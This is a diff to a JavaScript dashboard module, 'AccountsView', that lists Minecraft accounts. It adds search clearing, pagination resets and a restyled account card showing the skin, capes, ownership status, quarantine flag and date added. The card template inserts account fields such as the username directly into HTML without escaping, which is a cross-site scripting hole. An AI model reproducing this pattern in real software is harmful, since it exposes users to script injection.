+  setViewMode(mode) {
+    this.state.viewMode = mode;
+    localStorage.setItem('accounts_view_mode', mode);
+    this.render();
+  },
+
   onSearch() {
-    this.state.search = document.getElementById('acc-search-input').value;
+    const input = document.getElementById('acc-search-input');
+    this.state.search = input ? input.value.trim() : '';
+    this.state.page = 1;
+    this.loadAccounts();
+  },
+
+  clearSearch() {
+    this.state.search = '';
+    const input = document.getElementById('acc-search-input');
+    if (input) input.value = '';
     this.state.page = 1;
     this.loadAccounts();
   },
@@ -230,12 +565,14 @@ const AccountsView = {
 
   setSort(sort) {
     this.state.sort = sort;
+    this.state.page = 1;
     this.loadAccounts();
   },
 
   setPage(page) {
     this.state.page = page;
     this.loadAccounts();
+    window.scrollTo({ top: 0, behavior: 'smooth' });
   },
 
   toggleScope(checked) {
@@ -261,18 +598,23 @@ const AccountsView = {
 
       const bodyHtml = `
         <!-- Account Overview Card -->
-        <div style="display:flex;align-items:center;gap:16px;margin-bottom:20px;padding:16px;background:rgba(255,255,255,0.02);border-radius:var(--radius-md);border:1px solid var(--border-color);">
-          <img src="https://visage.surgeplay.com/full/${encodeURIComponent(acc.username)}" 
-               onerror="this.src='https://cdn.pfps.gg/pfps/59339-erwan-meunier.gif'"
-               style="height:90px;object-fit:contain;" />
-          <div>
-            <h3 style="font-size:1.2rem;font-weight:700;">${acc.username || 'Unknown'}</h3>
-            <div style="display:flex;gap:6px;margin-top:6px;flex-wrap:wrap;">
+        <div style="display:flex;align-items:center;gap:18px;margin-bottom:20px;padding:16px;background:rgba(255,255,255,0.02);border-radius:var(--radius-lg);border:1px solid var(--border-color);">
+          <img src="https://mc-heads.net/body/${encodeURIComponent(acc.username || 'Steve')}/right" 
+               onerror="this.src='https://mc-heads.net/body/MHF_Steve/right'"
+               style="height:110px;object-fit:contain;filter:drop-shadow(0 6px 12px rgba(0,0,0,0.6));" />
+          <div style="flex:1;">
+            <div style="display:flex;align-items:center;justify-content:space-between;">
+              <h3 style="font-size:1.3rem;font-weight:700;color:#fff;">${acc.username || 'Unknown'}</h3>
+              <span class="account-uid-tag">#${acc.uid}</span>
+            </div>
+            <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;">
               <span class="badge-tag ${acc.ownsmc && !acc.ownsmc.includes('Failed') ? 'success' : 'danger'}">${acc.ownsmc || 'None'}</span>
               <span class="badge-tag warning">${acc.capes || 'No Capes'}</span>
               ${acc.quarantine ? '<span class="badge-tag danger"><i class="fas fa-lock"></i> Quarantined</span>' : ''}
             </div>
-            <div style="font-size:0.75rem;color:var(--text-dim);margin-top:6px;font-family:var(--font-mono);">UID: ${acc.uid}</div>
+            <div style="font-size:0.78rem;color:var(--text-dim);margin-top:8px;">
+              Added: <b>${acc.time ? new Date(parseInt(acc.time, 10) * 1000).toLocaleString() : 'N/A'}</b>
+            </div>
           </div>
         </div>
 
